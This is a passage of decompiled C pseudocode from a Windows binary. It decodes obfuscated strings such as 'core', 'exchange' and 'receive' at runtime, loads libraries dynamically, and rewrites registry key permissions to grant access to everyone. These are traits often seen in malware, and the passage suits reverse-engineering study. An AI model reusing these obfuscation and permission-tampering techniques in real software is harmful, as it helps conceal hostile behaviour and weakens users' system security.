    byte_1400DA474 = (v5 - 12) ^ 0x69;
    byte_1400DA475 = (v5 - 13) ^ 0x55;
    byte_1400DA476 = (v5 - 14) ^ 0x6F;
    byte_1400DA477 = (v5 - 15) ^ 0x68;
    byte_1400DA478 = (v5 - 16) ^ 0x61;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x11ui64 )
  {
    sub_140004790(Src, 0x11ui64, 0i64);
    v5 = byte_1400DA45D;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  *((_BYTE *)v6 + 16) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 17i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 17) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA468[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x11 );
  return v3;
}
// 1400DA424: using guessed type int dword_1400DA424;
// 1400DA428: using guessed type int dword_1400DA428;
// 1400DA42C: using guessed type int dword_1400DA42C;
// 1400DA434: using guessed type int dword_1400DA434;
// 1400DA45D: using guessed type char byte_1400DA45D;
// 1400DA460: using guessed type int dword_1400DA460;
// 1400DA469: using guessed type char byte_1400DA469;
// 1400DA46A: using guessed type char byte_1400DA46A;
// 1400DA46B: using guessed type char byte_1400DA46B;
// 1400DA46C: using guessed type char byte_1400DA46C;
// 1400DA46D: using guessed type char byte_1400DA46D;
// 1400DA46E: using guessed type char byte_1400DA46E;
// 1400DA46F: using guessed type char byte_1400DA46F;
// 1400DA470: using guessed type char byte_1400DA470;
// 1400DA471: using guessed type char byte_1400DA471;
// 1400DA472: using guessed type char byte_1400DA472;
// 1400DA473: using guessed type char byte_1400DA473;
// 1400DA474: using guessed type char byte_1400DA474;
// 1400DA475: using guessed type char byte_1400DA475;
// 1400DA476: using guessed type char byte_1400DA476;
// 1400DA477: using guessed type char byte_1400DA477;
// 1400DA478: using guessed type char byte_1400DA478;

//----- (000000014002AD60) ----------------------------------------------------
char *sub_14002AD60()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DA450;
  if ( dword_1400DA450 & 1 )
  {
    v2 = byte_1400DA44D;
  }
  else
  {
    v1 = 69069 * dword_1400DA42C + 1234567;
    v0 = dword_1400DA450 | 1;
    dword_1400DA42C = v1;
    dword_1400DA450 |= 1u;
    dword_1400DA424 = HIWORD(dword_1400DA424) + 36969 * (unsigned __int16)dword_1400DA424;
    LOBYTE(v1) = (BYTE2(dword_1400DA434) + 80 * dword_1400DA434) ^ v1;
    dword_1400DA434 = HIWORD(dword_1400DA434) + 18000 * (unsigned __int16)dword_1400DA434;
    v2 = (((unsigned int)dword_1400DA428 >> 13) ^ 32 * dword_1400DA428 ^ dword_1400DA428) + v1;
    dword_1400DA428 ^= ((unsigned int)dword_1400DA428 >> 13) ^ 32 * (dword_1400DA428 ^ (dword_1400DA428 << 12));
    byte_1400DA44D = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DA450 = v0 | 2;
    byte_1400DA454[0] = v2 ^ 0x63;
    byte_1400DA455 = (v2 - 1) ^ 0x6F;
    byte_1400DA456 = (v2 - 2) ^ 0x72;
    byte_1400DA457 = (v2 - 3) ^ 0x65;
  }
  result = byte_1400DA458;
  if ( !byte_1400DA458[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DA454[v5++];
      v7 = v2 - v4++;
      byte_1400DA458[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 4 );
  }
  return result;
}
// 1400DA424: using guessed type int dword_1400DA424;
// 1400DA428: using guessed type int dword_1400DA428;
// 1400DA42C: using guessed type int dword_1400DA42C;
// 1400DA434: using guessed type int dword_1400DA434;
// 1400DA44D: using guessed type char byte_1400DA44D;
// 1400DA450: using guessed type int dword_1400DA450;
// 1400DA455: using guessed type char byte_1400DA455;
// 1400DA456: using guessed type char byte_1400DA456;
// 1400DA457: using guessed type char byte_1400DA457;

//----- (000000014002AE90) ----------------------------------------------------
void *sub_14002AE90()
{
  return qword_1400DA418;
}

//----- (000000014002AEA0) ----------------------------------------------------
void __fastcall sub_14002AEA0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 24) = a2;
}

//----- (000000014002AEB0) ----------------------------------------------------
char __fastcall sub_14002AEB0(__int64 a1, __int64 a2, _BYTE *a3)
{
  _BYTE *v3; // rdi
  __int64 v4; // r14
  size_t v6; // rbx
  size_t v7; // r8
  __time64_t v8; // rsi
  bool v9; // si
  volatile signed __int32 *v10; // rcx
  int v11; // esi
  _BYTE **v12; // rax
  volatile signed __int32 *v13; // rdi
  size_t v14; // r8
  char **v15; // rbx
  __int64 v16; // rbx
  int v17; // [rsp+28h] [rbp-D8h]
  __int64 v18; // [rsp+30h] [rbp-D0h]
  __time64_t v19; // [rsp+38h] [rbp-C8h]
  __int128 v20; // [rsp+40h] [rbp-C0h]
  __int64 (__fastcall *v21)(__int64); // [rsp+50h] [rbp-B0h]
  __int128 v22; // [rsp+58h] [rbp-A8h]
  __int64 v23; // [rsp+68h] [rbp-98h]
  char v24; // [rsp+70h] [rbp-90h]
  void *v25; // [rsp+E0h] [rbp-20h]
  __int64 v26; // [rsp+F0h] [rbp-10h]
  unsigned __int64 v27; // [rsp+F8h] [rbp-8h]
  void *v28; // [rsp+100h] [rbp+0h]
  __int64 v29; // [rsp+110h] [rbp+10h]
  unsigned __int64 v30; // [rsp+118h] [rbp+18h]
  void *v31; // [rsp+120h] [rbp+20h]
  __int64 v32; // [rsp+130h] [rbp+30h]
  unsigned __int64 v33; // [rsp+138h] [rbp+38h]
  void *Dst; // [rsp+140h] [rbp+40h]
  __int64 v35; // [rsp+150h] [rbp+50h]
  unsigned __int64 v36; // [rsp+158h] [rbp+58h]

  v23 = -2i64;
  v3 = a3;
  v4 = a1;
  if ( !a3 )
    return 0;
  v17 = 0;
  v18 = 0i64;
  v19 = time64(0i64) + 60;
  v36 = 15i64;
  v35 = 0i64;
  LOBYTE(Dst) = 0;
  v6 = -1i64;
  if ( *v3 )
  {
    v7 = -1i64;
    do
      ++v7;
    while ( v3[v7] );
  }
  else
  {
    v7 = 0i64;
  }
  sub_140004F20(&Dst, v3, v7);
  v9 = 1;
  if ( (unsigned __int8)sub_14002B230((__int64)&v17, &Dst) )
  {
    v8 = v19;
    if ( v19 )
    {
      if ( time64(0i64) < v8 )
        v9 = 0;
    }
  }
  if ( v36 >= 0x10 )
    operator delete(Dst);
  if ( v9 )
    return 0;
  v10 = *(volatile signed __int32 **)(v4 + 8);
  if ( v10 )
    _InterlockedExchange(v10, v17);
  v11 = v17;
  if ( (unsigned int)(v17 - 1) <= 3 )
  {
    sub_14001B230();
    if ( v11 == 2 && *(_QWORD *)(v4 + 24) )
    {
      v33 = 15i64;
      v32 = 0i64;
      LOBYTE(v31) = 0;
      if ( *v3 )
      {
        v14 = -1i64;
        do
          ++v14;
        while ( v3[v14] );
      }
      else
      {
        v14 = 0i64;
      }
      sub_140004F20(&v31, v3, v14);
      v27 = 15i64;
      v26 = 0i64;
      LOBYTE(v25) = 0;
      sub_140004F20(&v25, byte_1400A3400, 0i64);
      v30 = 15i64;
      v29 = 0i64;
      LOBYTE(v28) = 0;
      if ( *(_BYTE *)qword_1400DA418 )
      {
        do
          ++v6;
        while ( *((_BYTE *)qword_1400DA418 + v6) );
      }
      else
      {
        v6 = 0i64;
      }
      sub_140004F20(&v28, qword_1400DA418, v6);
      (*(void (__fastcall **)(_QWORD, void **, void **, void **, signed int))(**(_QWORD **)(v4 + 24) + 8i64))(
        *(_QWORD *)(v4 + 24),
        &v28,
        &v25,
        &v31,
        1);
      if ( v30 >= 0x10 )
        operator delete(v28);
      v30 = 15i64;
      v29 = 0i64;
      LOBYTE(v28) = 0;
      if ( v27 >= 0x10 )
        operator delete(v25);
      v27 = 15i64;
      v26 = 0i64;
      LOBYTE(v25) = 0;
      if ( v33 >= 0x10 )
        operator delete(v31);
      if ( !*(_QWORD *)(v4 + 32) )
      {
        v15 = (char **)operator new(8ui64);
        if ( v15 )
        {
          *(_QWORD *)&v20 = v4;
          DWORD2(v20) = 5;
          v21 = sub_14002A7E8;
          v22 = v20;
          sub_14002A5F0(v15, (__int64)&v21);
          sub_14001DAE0((void **)v15);
        }
        else
        {
          v15 = 0i64;
        }
        sub_14002A620((__int64 *)(v4 + 32), (__int64)v15);
      }
    }
    else
    {
      sub_14007C750(&v24);
      v16 = v18;
      if ( !v18 || v16 == GetCurrentProcessId() )
        (*(void (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v4 + 64i64))(v4, 0i64);
      sub_14007C820(&v24);
    }
  }
  else
  {
    switch ( v17 )
    {
      case 5:
        sub_14002D000(1);
        break;
      case 6:
        sub_14002D3D0(0i64);
        break;
      case 7:
        v12 = (_BYTE **)sub_14002EF80(&v20);
        sub_14002F160(*v12);
        v13 = (volatile signed __int32 *)*((_QWORD *)&v20 + 1);
        if ( *((_QWORD *)&v20 + 1) )
        {
          if ( !_InterlockedDecrement((volatile signed __int32 *)(*((_QWORD *)&v20 + 1) + 8i64)) )
          {
            (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v13 + 8i64))(v13);
            if ( !_InterlockedDecrement(v13 + 3) )
              (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v13 + 16i64))(v13);
          }
        }
        break;
    }
  }
  return 1;
}
// 14002EF80: using guessed type __int64 __fastcall sub_14002EF80(_QWORD);

//----- (000000014002B230) ----------------------------------------------------
__int64 __fastcall sub_14002B230(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rsi
  char v4; // di
  _QWORD *v5; // rax
  char v6; // bl
  _QWORD *v7; // rax
  bool v8; // bl
  _QWORD *v9; // rax
  __int64 v10; // rax
  double *v11; // rax
  __int64 v12; // rax
  _QWORD *v13; // rax
  __int64 v14; // rax
  double *v15; // rax
  unsigned __int8 v16; // bl
  char v18; // [rsp+28h] [rbp-D8h]
  char v19; // [rsp+40h] [rbp-C0h]
  __int64 v20; // [rsp+58h] [rbp-A8h]
  void *Src; // [rsp+60h] [rbp-A0h]
  unsigned __int64 v22; // [rsp+78h] [rbp-88h]
  void *v23; // [rsp+80h] [rbp-80h]
  void *v24; // [rsp+A8h] [rbp-58h]
  void *v25; // [rsp+D0h] [rbp-30h]
  __int64 v26; // [rsp+E0h] [rbp-20h]
  unsigned __int64 v27; // [rsp+E8h] [rbp-18h]
  void *v28; // [rsp+118h] [rbp+18h]
  __int64 v29; // [rsp+128h] [rbp+28h]
  unsigned __int64 v30; // [rsp+130h] [rbp+30h]

  v20 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = 0;
  sub_14006BD10((__int64)&v18, 0);
  v5 = sub_14006F4A0(&v23);
  v6 = sub_140070EE0((__int64)v5, v2, (__int64)&v18, 1);
  if ( v30 >= 0x10 )
    operator delete(v28);
  v30 = 15i64;
  v29 = 0i64;
  LOBYTE(v28) = 0;
  if ( v27 >= 0x10 )
    operator delete(v25);
  v27 = 15i64;
  v26 = 0i64;
  LOBYTE(v25) = 0;
  sub_140007D70(&v24);
  operator delete(v24);
  v24 = 0i64;
  sub_140007CF0(&v23);
  operator delete(v23);
  if ( !v6 )
    goto LABEL_25;
  v8 = 0;
  if ( sub_14006E900((__int64)&v18) )
  {
    v7 = sub_14002A900(&Src);
    v4 = 1;
    if ( sub_14006E8C0((__int64)&v18, v7) )
      v8 = 1;
  }
  if ( v4 & 1 && v22 >= 0x10 )
    operator delete(Src);
  if ( !v8 )
    goto LABEL_25;
  v9 = sub_14002A900(&Src);
  v10 = sub_14006C0C0((__int64)&v18, v9);
  v11 = (double *)sub_14006C4B0(v10, &unk_1400A2F80);
  *(_DWORD *)v3 = COERCE_UNSIGNED_INT64(sub_14006D7B0(v11));
  if ( v22 >= 0x10 )
    operator delete(Src);
  sub_14006BCD0((__int64)&v19, 0);
  v12 = sub_14006E540((__int64)&v18, (__int64)&Src, &unk_1400A2F84);
  *(double *)(v3 + 8) = sub_14006D4E0(v12);
  sub_14006BF10((__int64)&Src);
  sub_14006BF10((__int64)&v19);
  if ( *(_DWORD *)v3 && *(_DWORD *)v3 <= 7 )
  {
    v13 = sub_14002A900(&Src);
    v14 = sub_14006C0C0((__int64)&v18, v13);
    v15 = (double *)sub_14006C4B0(v14, &unk_1400A2F88);
    *(_QWORD *)(v3 + 16) = (unsigned int)COERCE_UNSIGNED_INT64(sub_14006D7B0(v15));
    if ( v22 >= 0x10 )
      operator delete(Src);
    v16 = 1;
  }
  else
  {
LABEL_25:
    v16 = 0;
  }
  sub_14006BF10((__int64)&v18);
  return v16;
}

//----- (000000014002B480) ----------------------------------------------------
void __fastcall sub_14002B480(__int64 a1)
{
  sub_14002A4C0(*(void **)(a1 + 16));
}

//----- (000000014002B490) ----------------------------------------------------
__int64 __fastcall sub_14002B490(__int64 *a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 *v3; // rdi
  _DWORD *v4; // rbx
  DWORD *v5; // rax
  __int64 v6; // rcx
  __int64 v7; // rax
  char v8; // al
  unsigned __int8 v9; // dl
  unsigned __int8 v11; // [rsp+20h] [rbp-98h]
  const char *v12; // [rsp+28h] [rbp-90h]
  char v13; // [rsp+30h] [rbp-88h]
  __int128 v14; // [rsp+38h] [rbp-80h]
  __int64 v15; // [rsp+48h] [rbp-70h]
  void *v16; // [rsp+50h] [rbp-68h]
  __int128 v17; // [rsp+68h] [rbp-50h]
  char v18; // [rsp+78h] [rbp-40h]
  __int64 v19; // [rsp+88h] [rbp-30h]
  __int64 v20; // [rsp+90h] [rbp-28h]

  v15 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = sub_140035C10(a1, &v13);
  v5 = sub_140035BF0((DWORD *)&v12);
  v6 = (unsigned int)*v4;
  if ( *v5 == (_DWORD)v6 )
  {
    v7 = sub_140030C00(v6);
    LODWORD(v14) = 36;
    *((_QWORD *)&v14 + 1) = v7;
    v12 = "boost thread: trying joining itself";
    std::exception::exception((std::exception *)&v16, &v12);
    v17 = v14;
    v20 = 15i64;
    v19 = 0i64;
    v18 = 0;
    v16 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v16);
  }
  v8 = sub_140035710(v3, v2, &v11);
  v9 = 0;
  if ( v8 )
    v9 = v11;
  return v9;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014002B590) ----------------------------------------------------
__int64 __fastcall sub_14002B590(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD))(a1 + 120))(*(_QWORD *)(a1 + 128), *(unsigned int *)(a1 + 136));
}

//----- (000000014002B5B0) ----------------------------------------------------
__int64 __fastcall sub_14002B5B0(__int64 a1)
{
  *(_QWORD *)a1 = &off_1400A6F50;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 40) = 7i64;
  *(_WORD *)(a1 + 16) = 0;
  return a1;
}
// 1400A6F50: using guessed type __int64 (__fastcall *off_1400A6F50)(void *);

//----- (000000014002B5E0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14002B5E0(_QWORD *a1))()
{
  _QWORD *v1; // rbx
  HMODULE v2; // rcx
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  *a1 = &off_1400A6F50;
  v2 = (HMODULE)a1[1];
  if ( v2 )
  {
    FreeLibrary(v2);
    v1[1] = 0i64;
  }
  (*(void (__fastcall **)(_QWORD *))(*v1 + 32i64))(v1);
  if ( v1[5] >= 8ui64 )
    operator delete((void *)v1[2]);
  v1[5] = 7i64;
  v1[4] = 0i64;
  *((_WORD *)v1 + 8) = 0;
  result = &off_1400A56B0;
  *v1 = &off_1400A56B0;
  return result;
}
// 1400A56B0: using guessed type __int64 (__fastcall *off_1400A56B0)();
// 1400A6F50: using guessed type __int64 (__fastcall *off_1400A6F50)(void *);

//----- (000000014002B660) ----------------------------------------------------
void *__fastcall sub_14002B660(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14002B5E0(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014002B690) ----------------------------------------------------
FARPROC __fastcall sub_14002B690(__int64 a1, const CHAR *a2)
{
  const CHAR *v2; // rbx
  __int64 v3; // rdi

  v2 = a2;
  v3 = a1;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 8i64))(a1, a1 + 16) )
    return 0i64;
  if ( *((_QWORD *)v2 + 3) >= 0x10ui64 )
    v2 = *(const CHAR **)v2;
  return GetProcAddress(*(HMODULE *)(v3 + 8), v2);
}

//----- (000000014002B6E0) ----------------------------------------------------
_BOOL8 __fastcall sub_14002B6E0(__int64 a1, _QWORD *a2)
{
  __int64 v2; // rbx
  void *v3; // rdi
  const CHAR *v4; // rax
  void *v6; // [rsp+28h] [rbp-30h]
  unsigned __int64 v7; // [rsp+40h] [rbp-18h]

  v2 = a1;
  if ( !*(_QWORD *)(a1 + 8) )
  {
    v3 = (void *)(a1 + 16);
    if ( (_QWORD *)(a1 + 16) != a2 )
      sub_140005050((void *)(a1 + 16), a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v4 = (const CHAR *)sub_1400054F0(v3, &v6);
    if ( *((_QWORD *)v4 + 3) >= 0x10ui64 )
      v4 = *(const CHAR **)v4;
    *(_QWORD *)(v2 + 8) = LoadLibraryA(v4);
    if ( v7 >= 0x10 )
      operator delete(v6);
  }
  return *(_QWORD *)(v2 + 8) != 0i64;
}

//----- (000000014002B790) ----------------------------------------------------
bool __fastcall sub_14002B790(__int64 a1)
{
  _QWORD *v1; // rbx
  HMODULE v2; // rcx

  v1 = (_QWORD *)a1;
  v2 = *(HMODULE *)(a1 + 8);
  if ( v2 )
  {
    FreeLibrary(v2);
    v1[1] = 0i64;
  }
  return (*(unsigned __int8 (__fastcall **)(_QWORD *))(*v1 + 32i64))(v1) == 0;
}

//----- (000000014002B7D0) ----------------------------------------------------
__int64 __fastcall sub_14002B7D0(__int64 a1, __int64 a2, int a3, int a4)
{
  __int64 v4; // rbx

  *(_QWORD *)a1 = a2;
  *(_DWORD *)(a1 + 8) = a3;
  v4 = a1;
  *(_DWORD *)(a1 + 12) = a4;
  memset((void *)(a1 + 16), 0, 0xC8ui64);
  return v4;
}

//----- (000000014002B800) ----------------------------------------------------
signed __int64 __fastcall sub_14002B800(__int64 a1)
{
  int v1; // esi
  _QWORD *v2; // rbx
  __int64 v4; // [rsp+20h] [rbp-108h]
  wchar_t Dest; // [rsp+30h] [rbp-F8h]
  char Dst; // [rsp+32h] [rbp-F6h]
  wchar_t Src; // [rsp+A0h] [rbp-88h]
  char v8; // [rsp+A2h] [rbp-86h]

  v1 = *(_DWORD *)(a1 + 8);
  v2 = (_QWORD *)a1;
  if ( !v1 && !*(_DWORD *)(a1 + 12) )
    return 0i64;
  if ( !*(_WORD *)(a1 + 16) )
  {
    Dest = 0;
    memset(&Dst, 0, 0x62ui64);
    if ( v1 )
    {
      LODWORD(v4) = v1;
      snwprintf(&Dest, 0x32ui64, L"(%s;CIOI;0x%x;;;%s)", L"A", v4, *v2);
    }
    Src = 0;
    memset(&v8, 0, 0x62ui64);
    if ( *((_DWORD *)v2 + 3) )
    {
      LODWORD(v4) = *((_DWORD *)v2 + 3);
      snwprintf(&Src, 0x32ui64, L"(%s;CIOI;0x%x;;;%s)", L"D", v4, *v2);
    }
    wcscpy_s((wchar_t *)v2 + 8, 0x64ui64, &Dest);
    wcscat_s((wchar_t *)v2 + 8, 0x64ui64, &Src);
  }
  return (signed __int64)(v2 + 2);
}
// 1400A6FA0: using guessed type wchar_t aA[2];
// 1400A6FA4: using guessed type wchar_t aD_0[2];

//----- (000000014002B950) ----------------------------------------------------
size_t *__fastcall sub_14002B950(size_t *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rsi
  _QWORD *v4; // rbp
  size_t *v5; // rbx
  unsigned __int64 v6; // rdx
  _BYTE *v7; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  v6 = a3[2] + a2[2];
  if ( a1[3] != v6 && sub_1400049C0(a1, v6, 1) )
  {
    v5[2] = 0i64;
    if ( v5[3] < 0x10 )
      v7 = v5;
    else
      v7 = (_BYTE *)*v5;
    *v7 = 0;
  }
  sub_140004B80(v5, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  sub_140004B80(v5, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v5;
}

//----- (000000014002BA10) ----------------------------------------------------
void __fastcall sub_14002BA10(HKEY hKey, _QWORD *a2, _QWORD *a3, char a4)
{
  char v4; // bl
  HKEY v5; // rdi
  const CHAR *v6; // rdx
  DWORD v7; // ebx
  ACL *v8; // rdi
  DWORD v9; // er8
  DWORD v10; // ebx
  PSID pSid; // [rsp+60h] [rbp-29h]
  HKEY hKeya; // [rsp+68h] [rbp-21h]
  char pSecurityDescriptor; // [rsp+70h] [rbp-19h]
  __int64 v14; // [rsp+98h] [rbp+Fh]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [rsp+A0h] [rbp+17h]
  LPCSTR lpSubKey; // [rsp+A8h] [rbp+1Fh]
  unsigned __int64 v17; // [rsp+C0h] [rbp+37h]

  v14 = -2i64;
  v4 = a4;
  v5 = hKey;
  sub_14002B950((size_t *)&lpSubKey, a2, a3);
  v6 = (const CHAR *)&lpSubKey;
  if ( v4 )
  {
    hKeya = 0i64;
    if ( v17 >= 0x10 )
      v6 = lpSubKey;
    if ( !RegOpenKeyExA(v5, v6, 0, 0x40000u, &hKeya) )
    {
      *(_DWORD *)pIdentifierAuthority.Value = 0;
      *(_WORD *)&pIdentifierAuthority.Value[4] = 256;
      pSid = 0i64;
      if ( AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, &pSid) == 1 )
      {
        v7 = GetLengthSid(pSid) + 16;
        v8 = (ACL *)operator new(v7);
        if ( InitializeAcl(v8, v7, 2u) == 1 )
        {
          v9 = 393241;
LABEL_14:
          if ( AddAccessAllowedAce(v8, 2u, v9, pSid) == 1
            && InitializeSecurityDescriptor(&pSecurityDescriptor, 1u) == 1
            && SetSecurityDescriptorDacl(&pSecurityDescriptor, 1, v8, 0) == 1 )
          {
            RegSetKeySecurity(hKeya, 4u, &pSecurityDescriptor);
          }
          goto LABEL_18;
        }
        goto LABEL_18;
      }
      goto LABEL_19;
    }
  }
  else
  {
    hKeya = 0i64;
    if ( v17 >= 0x10 )
      v6 = lpSubKey;
    if ( !RegOpenKeyExA(v5, v6, 0, 0x40000u, &hKeya) )
    {
      *(_DWORD *)pIdentifierAuthority.Value = 0;
      *(_WORD *)&pIdentifierAuthority.Value[4] = 256;
      pSid = 0i64;
      if ( AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, &pSid) == 1 )
      {
        v10 = GetLengthSid(pSid) + 16;
        v8 = (ACL *)operator new(v10);
        if ( InitializeAcl(v8, v10, 2u) == 1 )
        {
          v9 = 983103;
          goto LABEL_14;
        }
LABEL_18:
        operator delete[](v8);
        FreeSid(pSid);
      }
LABEL_19:
      RegCloseKey(hKeya);
      goto LABEL_20;
    }
  }
LABEL_20:
  if ( v17 >= 0x10 )
    operator delete((void *)lpSubKey);
}

//----- (000000014002BC40) ----------------------------------------------------
_QWORD *__fastcall sub_14002BC40(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rsi

  v2 = a2;
  v3 = a1;
  *a1 = &off_1400A70A0;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[1] = sub_14002C1B0(a1 + 1, 0i64, 0i64);
  *v3 = &off_1400A70C0;
  v3[3] = v2;
  return v3;
}
// 14002C1B0: using guessed type __int64 __fastcall sub_14002C1B0(_QWORD, _QWORD, _QWORD);
// 1400A70A0: using guessed type __int64 (__fastcall *off_1400A70A0)(void *);
// 1400A70C0: using guessed type __int64 (__fastcall *off_1400A70C0)(void *);

//----- (000000014002BCB0) ----------------------------------------------------
void **__fastcall sub_14002BCB0(void *a1, char a2)
{
  void **v2; // rsi
  char v3; // di

  v2 = (void **)a1;
  v3 = a2;
  sub_1400298B0((void ***)a1 + 1);
  operator delete(v2[1]);
  *v2 = &off_1400A2D20;
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}
// 1400A2D20: using guessed type __int64 (__fastcall *off_1400A2D20)();

//----- (000000014002BD10) ----------------------------------------------------
char *sub_14002BD10()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DA4BC;
  if ( dword_1400DA4BC & 1 )
  {
    v2 = byte_1400DA4B8;
  }
  else
  {
    v1 = 69069 * dword_1400DA48C + 1234567;
    v0 = dword_1400DA4BC | 1;
    dword_1400DA48C = v1;
    dword_1400DA4BC |= 1u;
    dword_1400DA484 = HIWORD(dword_1400DA484) + 36969 * (unsigned __int16)dword_1400DA484;
    LOBYTE(v1) = (BYTE2(dword_1400DA49C) + 80 * dword_1400DA49C) ^ v1;
    dword_1400DA49C = HIWORD(dword_1400DA49C) + 18000 * (unsigned __int16)dword_1400DA49C;
    v2 = (((unsigned int)dword_1400DA488 >> 13) ^ 32 * dword_1400DA488 ^ dword_1400DA488) + v1;
    dword_1400DA488 ^= ((unsigned int)dword_1400DA488 >> 13) ^ 32 * (dword_1400DA488 ^ (dword_1400DA488 << 12));
    byte_1400DA4B8 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DA4BC = v0 | 2;
    byte_1400DA4C0[0] = v2 ^ 0x65;
    byte_1400DA4C1 = (v2 - 1) ^ 0x78;
    byte_1400DA4C2 = (v2 - 2) ^ 0x63;
    byte_1400DA4C3 = (v2 - 3) ^ 0x68;
    byte_1400DA4C4 = (v2 - 4) ^ 0x61;
    byte_1400DA4C5 = (v2 - 5) ^ 0x6E;
    byte_1400DA4C6 = (v2 - 6) ^ 0x67;
    byte_1400DA4C7 = (v2 - 7) ^ 0x65;
  }
  result = byte_1400DA4C8;
  if ( !byte_1400DA4C8[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DA4C0[v5++];
      v7 = v2 - v4++;
      byte_1400DA4C8[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 8 );
  }
  return result;
}
// 1400DA484: using guessed type int dword_1400DA484;
// 1400DA488: using guessed type int dword_1400DA488;
// 1400DA48C: using guessed type int dword_1400DA48C;
// 1400DA49C: using guessed type int dword_1400DA49C;
// 1400DA4B8: using guessed type char byte_1400DA4B8;
// 1400DA4BC: using guessed type int dword_1400DA4BC;
// 1400DA4C1: using guessed type char byte_1400DA4C1;
// 1400DA4C2: using guessed type char byte_1400DA4C2;
// 1400DA4C3: using guessed type char byte_1400DA4C3;
// 1400DA4C4: using guessed type char byte_1400DA4C4;
// 1400DA4C5: using guessed type char byte_1400DA4C5;
// 1400DA4C6: using guessed type char byte_1400DA4C6;
// 1400DA4C7: using guessed type char byte_1400DA4C7;

//----- (000000014002BE70) ----------------------------------------------------
char *sub_14002BE70()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DA4A4;
  if ( dword_1400DA4A4 & 1 )
  {
    v2 = byte_1400DA4A0;
  }
  else
  {
    v1 = 69069 * dword_1400DA48C + 1234567;
    v0 = dword_1400DA4A4 | 1;
    dword_1400DA48C = v1;
    dword_1400DA4A4 |= 1u;
    dword_1400DA484 = HIWORD(dword_1400DA484) + 36969 * (unsigned __int16)dword_1400DA484;
    LOBYTE(v1) = (BYTE2(dword_1400DA49C) + 80 * dword_1400DA49C) ^ v1;
    dword_1400DA49C = HIWORD(dword_1400DA49C) + 18000 * (unsigned __int16)dword_1400DA49C;
    v2 = (((unsigned int)dword_1400DA488 >> 13) ^ 32 * dword_1400DA488 ^ dword_1400DA488) + v1;
    dword_1400DA488 ^= ((unsigned int)dword_1400DA488 >> 13) ^ 32 * (dword_1400DA488 ^ (dword_1400DA488 << 12));
    byte_1400DA4A0 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DA4A4 = v0 | 2;
    byte_1400DA4A8[0] = v2 ^ 0x72;
    byte_1400DA4A9 = (v2 - 1) ^ 0x65;
    byte_1400DA4AA = (v2 - 2) ^ 0x63;
    byte_1400DA4AB = (v2 - 3) ^ 0x65;
    byte_1400DA4AC = (v2 - 4) ^ 0x69;
    byte_1400DA4AD = (v2 - 5) ^ 0x76;
    byte_1400DA4AE = (v2 - 6) ^ 0x65;
  }
  result = byte_1400DA4B0;
  if ( !byte_1400DA4B0[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DA4A8[v5++];
